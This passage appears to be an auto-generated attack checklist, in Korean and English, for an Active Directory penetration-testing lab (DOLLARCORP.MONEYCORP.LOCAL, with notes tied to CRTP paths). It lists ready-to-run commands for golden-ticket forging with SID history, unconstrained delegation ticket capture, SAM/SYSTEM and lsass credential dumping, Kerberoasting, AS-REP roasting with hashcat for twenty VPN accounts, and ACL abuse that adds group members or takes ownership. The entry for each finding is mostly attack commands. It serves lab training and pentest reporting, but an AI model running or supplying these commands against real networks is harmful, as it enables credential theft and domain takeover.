  - _SID history (SID filtering OFF — 사용 가능)_:
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-1028785420-4100948154-1806204659-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain US.DOLLARCORP.MONEYCORP.LOCAL
    ```
- **확인할 것**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = OFF (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- **메모**: 대상 US.DOLLARCORP.MONEYCORP.LOCAL (SID S-1-5-21-1028785420-4100948154-1806204659). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.

### [CRITICAL] Unconstrained Delegation abuse  ·  _Domain Privilege Escalation_  (prio 15)
- **대상**: DCORP-APPSRV$
- **근거**: DCORP-APPSRV$ (computer) TRUSTED_FOR_DELEGATION
- **명령어**:
  - _Enum (PowerView)_:
    ```
    Get-DomainComputer -Unconstrained | select samaccountname
    ```
    ```
    Get-DomainUser -TrustedToAuth | select samaccountname
    ```
  - _Rubeus monitor_:
    ```
    Rubeus.exe monitor /interval:5 /nowrap
    ```
  - _Coerce (auth)_:
    ```
    # PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처
    ```
    ```
    Rubeus.exe tgtdeleg
    ```
  - _PTT_:
    ```
    Rubeus.exe ptt /ticket:<base64_TGT>
    ```
- **확인할 것**:
  - [ ] 해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)
  - [ ] 캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] DCORP-APPSRV$ Unconstrained delegation 속성 확인
  - [ ] Rubeus monitor 로 캡처된 TGT 화면
  - [ ] PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)
- **메모**: 비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로.

### [HIGH] SeBackup -> read SAM/SYSTEM & sensitive files  ·  _Local Privilege Escalation_  (prio 16)
- **대상**: <current host>
- **근거**: token holds SeBackupPrivilege (Enabled)
- **명령어**:
  - _reg save_:
    ```
    reg save hklm\sam sam.hiv
    ```
    ```
    reg save hklm\system system.hiv
    ```
    ```
    # offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL
    ```
- **확인할 것**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] whoami /priv 에 SeBackupPrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- **메모**: Bypasses file DACLs for reads -> dump local hashes offline. Then crack / pass local admin hash.

### [HIGH] SeDebug -> inject into SYSTEM process / dump lsass  ·  _Local Privilege Escalation_  (prio 16)
- **대상**: <current host>
- **근거**: token holds SeDebugPrivilege (Disabled)
- **명령어**:
  - _mimikatz_:
    ```
    Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
    ```
- **확인할 것**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] whoami /priv 에 SeDebugPrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- **메모**: Debug any process -> read lsass memory / migrate to SYSTEM. Usually implies near-admin already.

### [HIGH] Kerberoasting  ·  _Domain Privilege Escalation_  (prio 20)
- **대상**: svcadmin
- **근거**: svcadmin has SPN set [adminCount=1]; pwdlastset=1668416797
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe kerberoast /user:svcadmin /nowrap /outfile:hash_svcadmin.txt
    ```
  - _PowerView_:
    ```
    Invoke-Kerberoast -Identity svcadmin | fl
    ```
  - _AD Module_:
    ```
    Get-ADUser -Identity svcadmin -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName
    ```
  - _Crack_:
    ```
    hashcat -m 13100 hash_svcadmin.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)
  - [ ] 해시 추출 성공 여부, 크랙된 평문 패스워드
  - [ ] 크랙한 계정이 어떤 그룹/권한을 가지는지 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] svcadmin SPN 확인 (Get-ADUser/setspn 출력)
  - [ ] Rubeus kerberoast 해시 추출 화면
  - [ ] hashcat 크랙 성공 (평문 노출) 화면
  - [ ] 크랙한 계정으로 인증/권한 확인 화면
- **메모**: Kerberoasting svcadmin. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN201user
- **근거**: VPN201user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN201user /nowrap /format:hashcat /outfile:asrep_VPN201user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN201user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN201user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN201user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN202user
- **근거**: VPN202user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN202user /nowrap /format:hashcat /outfile:asrep_VPN202user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN202user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN202user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN202user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN203user
- **근거**: VPN203user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN203user /nowrap /format:hashcat /outfile:asrep_VPN203user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN203user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN203user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN203user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN204user
- **근거**: VPN204user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN204user /nowrap /format:hashcat /outfile:asrep_VPN204user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN204user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN204user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN204user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN205user
- **근거**: VPN205user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN205user /nowrap /format:hashcat /outfile:asrep_VPN205user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN205user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN205user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN205user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN206user
- **근거**: VPN206user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN206user /nowrap /format:hashcat /outfile:asrep_VPN206user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN206user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN206user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN206user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN207user
- **근거**: VPN207user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN207user /nowrap /format:hashcat /outfile:asrep_VPN207user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN207user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN207user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN207user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN208user
- **근거**: VPN208user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN208user /nowrap /format:hashcat /outfile:asrep_VPN208user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN208user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN208user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN208user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN209user
- **근거**: VPN209user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN209user /nowrap /format:hashcat /outfile:asrep_VPN209user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN209user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN209user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN209user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN210user
- **근거**: VPN210user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN210user /nowrap /format:hashcat /outfile:asrep_VPN210user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN210user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN210user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN210user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN211user
- **근거**: VPN211user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN211user /nowrap /format:hashcat /outfile:asrep_VPN211user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN211user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN211user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN211user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN212user
- **근거**: VPN212user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN212user /nowrap /format:hashcat /outfile:asrep_VPN212user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN212user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN212user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN212user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN213user
- **근거**: VPN213user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN213user /nowrap /format:hashcat /outfile:asrep_VPN213user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN213user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN213user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN213user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN214user
- **근거**: VPN214user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN214user /nowrap /format:hashcat /outfile:asrep_VPN214user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN214user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN214user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN214user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN215user
- **근거**: VPN215user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN215user /nowrap /format:hashcat /outfile:asrep_VPN215user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN215user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN215user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN215user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN216user
- **근거**: VPN216user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN216user /nowrap /format:hashcat /outfile:asrep_VPN216user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN216user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN216user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN216user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN217user
- **근거**: VPN217user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN217user /nowrap /format:hashcat /outfile:asrep_VPN217user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN217user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN217user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN217user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN218user
- **근거**: VPN218user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN218user /nowrap /format:hashcat /outfile:asrep_VPN218user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN218user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN218user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN218user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN219user
- **근거**: VPN219user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN219user /nowrap /format:hashcat /outfile:asrep_VPN219user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN219user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN219user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN219user — 사전 인증 불필요 계정.

### [HIGH] AS-REP Roasting  ·  _Domain Privilege Escalation_  (prio 22)
- **대상**: VPN220user
- **근거**: VPN220user has DONT_REQ_PREAUTH set
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN220user /nowrap /format:hashcat /outfile:asrep_VPN220user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN220user.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- **📸 스크린샷 (보고서 필수)**:
  - [ ] VPN220user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- **메모**: AS-REP roasting VPN220user — 사전 인증 불필요 계정.

### [HIGH] ACL abuse: GenericWrite  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs
    ```
- **확인할 것**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: GenericWrite  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: CIADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity DCORP-MGMT$ -ResolveGUIDs
    ```
- **확인할 것**:
  - [ ] CIADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: CIADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: GenericWrite  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: Owns  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Local System has Owns over DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    Add-DomainGroupMember -Identity 'DnsUpdateProxy' -Members <you>
    ```
  - _AD Module_:
    ```
    Add-ADGroupMember -Identity 'DnsUpdateProxy' -Members <you>
    ```
- **확인할 것**:
  - [ ] Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: Local System -(Owns)-> DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: WriteDacl  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
